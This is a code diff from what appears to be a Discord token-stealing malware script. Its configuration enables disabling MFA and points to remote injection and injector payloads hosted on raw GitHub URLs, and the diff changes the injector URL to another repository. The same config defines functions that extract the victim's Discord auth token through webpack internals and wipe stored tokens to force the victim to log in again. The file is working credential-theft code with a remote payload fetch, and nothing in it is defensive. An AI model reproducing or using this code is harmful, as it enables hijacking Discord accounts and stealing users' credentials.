@@ -39,7 +39,7 @@ const CONFIG = {
     auto_mfa_disabler: 'true',
     auto_email_update: 'false',
     injection_url: 'https://raw.githubusercontent.com/allahsanaheyecan/banadahuzurversin/refs/heads/main/injection.js',
-    injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
+    injector_url: 'https://raw.githubusercontent.com/allahsanaheyecan/banadahuzurversin/refs/heads/main/injector.js',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
         logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
